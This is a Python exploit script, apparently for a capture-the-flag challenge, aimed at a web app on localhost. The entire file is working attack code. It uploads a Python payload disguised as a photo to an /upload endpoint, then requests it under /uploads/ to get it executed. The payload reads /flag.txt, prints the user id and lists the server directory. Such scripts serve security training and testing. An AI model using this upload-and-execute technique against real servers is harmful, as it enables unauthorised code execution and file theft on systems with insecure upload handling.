import requests
import os
import time

def create_payload():
    return """#!/usr/bin/env python3
import subprocess
import sys
import os

try:
    with open('/flag.txt', 'r') as f:
        print(f.read())
except Exception as e:
    print(f"Error reading flag: {e}")

# Print some debug info
print("\\nDebug Info:")
print(f"Current user: {os.getuid()}")
print(f"Current directory: {os.getcwd()}")
print(f"Directory contents: {os.listdir('.')}")
"""

def exploit_upload(url="http://localhost:8080"):
    session = requests.Session()
    print("[+] Getting session cookie...")
    resp = session.get(url)
    print("[+] Session cookie:", session.cookies.get_dict())

    payload = create_payload()
    filename = 'readflag.py'
    
    files = {
        'photo': (filename, payload.encode(), 'text/plain'),
    }
    data = {
        'name': 'Test User',
        'email': 'test@test.com'
    }

    print(f"[+] Uploading payload...")
    upload_resp = session.post(f"{url}/upload", files=files, data=data)
    print(f"[+] Upload response status: {upload_resp.status_code}")
    
    time.sleep(1)
    
    print("[+] Attempting to execute payload...")
    try:
        exec_resp = session.get(f"{url}/uploads/{filename}")
        print("[+] Response status:", exec_resp.status_code)
        print("[+] Server response:")
        print(exec_resp.text)
        
        if 'flag{' in exec_resp.text or 'CTF{' in exec_resp.text:
            print("[+] Found flag!")
            return True
                
    except Exception as e:
        print(f"[-] Error during execution: {e}")
    
    print("[-] No flag found")
    return False

if __name__ == "__main__":
    import sys
    target_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8013"
    print(f"[+] Targeting: {target_url}")
    
    if exploit_upload(target_url):
        print("[+] Exploit successful!")
    else:
        print("[-] Exploit failed!")
